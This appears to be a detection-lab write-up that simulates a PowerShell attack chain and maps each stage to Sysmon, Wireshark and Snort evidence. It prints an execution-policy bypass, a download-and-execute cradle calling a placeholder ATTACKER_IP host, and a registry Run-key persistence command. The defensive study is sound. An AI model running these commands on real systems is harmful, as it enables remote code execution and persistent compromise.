# Scenario 1 — PowerShell Attack Chain

## Objective

Simulate a PowerShell-based attack chain and observe how the activity is reflected across endpoint and network telemetry.

---

## Attack Overview

The attack consists of four stages:

1. Execution
2. Payload Delivery
3. Network Communication
4. Persistence

Each stage was monitored using Sysmon, Splunk, Wireshark, and Snort.

---

## Attack Steps

### 1. Execution

PowerShell was executed with a bypass flag:

```powershell
powershell -ExecutionPolicy Bypass
```

This flag can be used to bypass PowerShell execution restrictions and is commonly associated with malicious activity.

### 2. Payload Delivery

The victim machine downloaded and executed a remote script from the attacker machine:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER_IP:8000/payload.ps1")
```

This technique allows remote code execution directly in memory without saving the file to disk.

### 3. Network Activity

An HTTP connection was established between the victim and attacker systems.

This communication was observed using:

- Sysmon (Event ID 3)
- Wireshark (packet capture)
- Snort (network alert)

### 4. Persistence

A registry run key was created to maintain persistence:

```powershell
New-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Updater -Value "powershell.exe"
```

This ensures that PowerShell will execute automatically when the user logs in.

## Evidence

### PowerShell Execution (Sysmon Event ID 1)

PowerShell execution was observed with suspicious parameters.

### Payload Retrieval (PowerShell Command)

A remote script was downloaded and executed using PowerShell.

### Network Connection (Sysmon Event ID 3)

An outbound connection from the PowerShell process to the attacker machine was detected.

### Network Traffic (Wireshark)

HTTP traffic shows the request for the payload from the attacker server.

### Snort Alert

Snort detected suspicious network activity associated with the attack.

### Persistence (Sysmon Event ID 13)

A registry key was created to establish persistence.
